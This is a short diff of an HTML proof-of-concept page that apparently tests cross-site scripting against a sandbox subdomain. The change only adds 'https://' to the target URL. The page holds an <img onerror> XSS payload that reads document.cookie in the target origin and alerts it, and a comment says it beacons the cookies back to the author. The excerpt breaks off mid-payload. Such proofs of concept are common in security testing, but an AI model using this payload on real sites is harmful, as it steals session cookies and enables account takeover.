@@ -7,7 +7,7 @@ whatever <code>document.cookie</code> returns there.</p>
 <button id="go" style="font-size:20px;padding:10px 20px">Launch cookie test</button>
 <pre id="log" style="background:#111;color:#0f0;padding:12px;margin-top:16px;white-space:pre-wrap"></pre>
 <script>
-const TARGET = "1h5unt232120260513050826.sandbox.bamkounified.com";
+const TARGET = "https://1h5unt232120260513050826.sandbox.bamkounified.com";
 // Payload reads document.cookie IN THE TARGET ORIGIN, alerts it, and beacons it back to us.
 const PAYLOAD =
   '<img src=x onerror="var c=document.cookie;alert(\'being-aman | cookies=\'+c);' +
